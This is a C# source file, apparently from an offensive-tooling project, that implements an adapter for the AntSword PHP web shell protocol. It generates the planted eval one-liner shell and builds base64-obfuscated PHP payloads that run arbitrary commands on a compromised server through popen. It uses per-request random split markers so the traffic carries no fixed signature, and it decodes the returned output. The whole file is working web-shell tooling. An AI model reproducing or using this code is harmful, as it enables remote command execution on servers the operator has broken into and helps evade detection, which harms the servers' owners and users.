using System.Text;

namespace Rod.Transport.WebShells;

/// <summary>
/// The AntSword-compatible PHP family (the open-source manager's eval
/// one-liner, MIT): the server-side footprint is a single
/// <c>@eval($_POST[...])</c> line, and every request builds its own
/// wrapper -- the bootstrap parameter carries
/// <c>@eval(@base64_decode($_POST['&lt;random&gt;']))</c>, the random
/// parameter carries the base64 payload, and the payload itself frames
/// its answer with random marker halves around a base64-encoded body.
/// Nothing is baked into the placed file beyond the parameter name, which
/// is what makes the family interoperable: a script placed for one client
/// answers any client that speaks the shape.
///
/// The command runs through the standard, documented process functions --
/// a PATH setup for both OS families and a read pipe, the plain shape the
/// family's template uses. No function-fallback chains and no bypass
/// logic: those belong to out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class AntSwordPhpAdapter : IWebShellProtocolAdapter
{
    public string Id => "antsword-php";
    public string ScriptLanguage => "php";
    public string DefaultEncoder => "base64";
    public string DefaultDecoder => "base64";

    public string RenderScript(string password)
        => $"<?php @eval($_POST['{password}']); ?>";

    public WebShellRequest EncodeCommand(
        string url,
        string password,
        string encoder,
        string decoder,
        string command)
    {
        if (encoder != "base64")
            throw new NotSupportedException($"The {Id} adapter implements the base64 encoder, not '{encoder}'.");
        if (decoder is not ("base64" or "default"))
            throw new NotSupportedException($"The {Id} adapter implements the base64 and default decoders, not '{decoder}'.");

        // The markers are random per request, each echoed as two
        // concatenated halves so the wrapper itself carries no fixed
        // signature -- the family's own traffic shape.
        var tagStart = WebShellAdapters.RandomToken(6, 12);
        var tagEnd = WebShellAdapters.RandomToken(6, 12);
        var payloadVariable = WebShellAdapters.RandomToken(8, 14);
        var commandEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));

        // The command rides base64-encoded inside the payload, so no
        // quoting of the operator's text ever touches the PHP string.
        var payload =
            "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);"
            + $"$c=base64_decode('{commandEncoded}');"
            + "$d=dirname($_SERVER[\"SCRIPT_FILENAME\"]);"
            + "if(substr($d,0,1)===\"/\"){"
            + "@putenv(\"PATH=\".getenv(\"PATH\").\":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\");"
            + "}else{"
            + "@putenv(\"PATH=\".getenv(\"PATH\").\";C:\\\\Windows\\\\system32;C:\\\\Windows;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\\");"
            + "}"
            + "$p=@popen($c,\"r\");$o=\"\";"
            + "if($p){while(!@feof($p)){$o.=@fread($p,4096);}@pclose($p);}"
            + "echo \"" + Half(tagStart) + "\".\"" + HalfBack(tagStart) + "\";"
            + "echo @base64_encode($o);"
            + "echo \"" + Half(tagEnd) + "\".\"" + HalfBack(tagEnd) + "\";"
            + "die();";

        var form = new Dictionary<string, string>
        {
            [password] = $"@eval(@base64_decode($_POST['{payloadVariable}']));",
            [payloadVariable] = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)),
        };
        return new WebShellRequest(url, form, tagStart, tagEnd);
    }

    public string? DecodeResponse(WebShellRequest request, string decoder, ReadOnlySpan<char> body)
    {
        var start = body.IndexOf(request.TagStart);
        if (start < 0)
            return null;
        var afterStart = start + request.TagStart.Length;
        var end = body.Slice(afterStart).IndexOf(request.TagEnd);
        if (end < 0)
            return null;

        var encoded = body.Slice(afterStart, end).Trim();
        if (decoder != "base64")
            return encoded.ToString();

        try
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String(encoded.ToString()));
        }
        catch (FormatException)
        {
            // The markers matched but the body between them is not the
            // base64 this decoder expects -- an endpoint answering a
            // different protocol shape.
            return null;
        }
    }

    // The two halves of a marker: split at the middle so the payload's own
    // text never contains the marker whole.
    private static string Half(string tag) => tag[..(tag.Length / 2)];

    private static string HalfBack(string tag) => tag[(tag.Length / 2)..];
}
